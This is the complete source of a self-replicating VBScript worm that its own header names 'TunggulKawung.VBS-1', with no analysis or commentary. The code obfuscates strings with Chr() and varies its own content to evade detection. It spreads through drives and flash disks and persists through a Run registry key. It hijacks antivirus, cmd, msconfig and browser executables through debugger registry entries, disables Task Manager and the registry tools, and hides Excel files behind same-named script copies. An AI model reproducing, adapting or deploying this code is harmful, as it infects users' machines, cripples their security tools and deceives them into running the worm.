' Anti CRC dan Ukuran File
' Nama Virus : TunggulKawung.VBS-1

on error resume next
Dim winpath, FlashDisk, fso, wsshell, nask, filekor,execu, cinta, repe1,repe2
Dim Drives, Drive, cekdrive, tekvir, text, Buatfile, namafile, filetext
repe1 = Chr(97) & Chr(110) & Chr(115) & Chr(97) & Chr(118)
repe2 = repe1 & Chr(103) & Chr(100)
cinta =Chr(99)&Chr(58)&Chr(92)&Chr(99)&Chr(105)&Chr(110)&Chr(116)&Chr(97)&Chr(46)&Chr(101)&Chr(120)&Chr(101)
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsshell = CreateObject("WScript.Shell")
Set filetext = fso.OpenTextFile(WScript.ScriptFullName,1)
Set execu = Wsshell.Exec(cinta)
namafile = "Tunggul.vbs"
Set nask = fso.getfile(Wscript.ScriptFullname)
cekdrive = nask.drive.drivetype
Set winpath = fso.GetSpecialFolder(0)
Set text = nask.openastextstream(1, -2)
Randomize Timer
Aka=Int(rnd*1000)
Akb=Int(rnd*30)
If Akb=0 Then Akb=10
Tamb=String(Akb,"-")
tekavir = text.readline
tekvir="' "&Aka&Tamb&vbCrLf
Do While Not text.atendofstream
  tekvir = tekvir&text.readline
  tekvir = tekvir&vbCrLf
Loop
sudah=0

Do
 Set filekor = fso.getfile(winpath & "\" & namafile)
  filekor.Attributes = 32
 Set filekor = fso.createtextfile(winpath & "\" & namafile, 2, True)
  filekor.write tekvir
  filekor.Close
 Set filekor = fso.getfile(winpath & "\" & namafile)
  filekor.Attributes = 39
 For Each FlashDisk In fso.drives
   If (FlashDisk.drivetype = 1 Or FlashDisk.drivetype = 2) And FlashDisk.Path <> "A:" Then
     Set filekor = fso.getfile(FlashDisk.Path & "\" & namafile)
      filekor.Attributes = 32
     Set filekor = fso.createtextfile(FlashDisk.Path & "\" & namafile, 2, True)
      filekor.write tekvir
      filekor.Close
   End If
 Next
 rdw="REG_DWORD"

 Smwc = "\Software\Microsoft\Windows\CurrentVersion\"
 Hsmwci = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
 wsshell.regwrite "HKLM"&Smwc&"Run\WinSistem", "wscript.exe " & winpath & "\" & namafile
 wsshell.regwrite Hsmwci&"cmd.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"msconfig.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"PCMAV.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"PCMAV-CLN.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"PCMAV-RTP.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"PCMAV-SE.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"VB6.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"autorun.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&repe1&".exe\Debugger",cinta
 wsshell.regwrite Hsmwci&repe2&".exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"viremoval.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"avscan.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"avgnt.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"iexplore.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"firefox.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"YahooMessenger.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"FrzState2k.exe\Debugger",cinta
 wsshell.regwrite Hsmwci&"DF5Serv.exe\Debugger",cinta
 wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoFind", "1", rdw
 wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoFolderOptions", "1", rdw
 wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoRun", "1", rdw
 wsshell.RegWrite "HKCU"&Smwc&"Policies\System\DisableRegistryTools", "1", rdw
 wsshell.RegWrite "HKCU"&Smwc&"Policies\System\DisableTaskMgr", "1", rdw
 wsshell.regwrite "HKCR\vbsfile\DefaultIcon", "shell32.dll,2"
   If Minute(Now)=1 and sudah<>1 Then 
     Tularifilexls()
     sudah=1
   End If
 If cekdrive <> 1 Then Wscript.sleep 100000
Loop While cekdrive <> 1

Sub Tularifilexls()
  Set Drives=fso.drives
  For Each Drive In Drives
    If Drive<>"A:" Then
       If Drive.IsReady Then
        Cari Drive & "\" 
       End If
    End If
  Next
End sub

Function Cari(Path)
  On Error Resume Next
  Dim Folder, Subfolder, SubFolders, File, Files, filekor
  Set Folder=fso.GetFolder(Path)
  Set Files=Folder.Files
  For Each File In Files
   If fso.GetExtensionName(File.Path)="xls" Then
      namfa=fso.GetBaseName(File.Path)
      Set filekor = fso.GetFile(File.Path)
      filekor.Attributes = 39
      Set Buatfile=fso.CreateTextFile(File.ParentFolder & "\" & namfa & ".vbs")
      Buatfile.Write tekvir
      Buatfile.Close()
   End If
  Next
  Set SubFolders=Folder.SubFolders
  For Each Subfolder In Subfolders
    Cari Subfolder.Path 
  Next
End Function

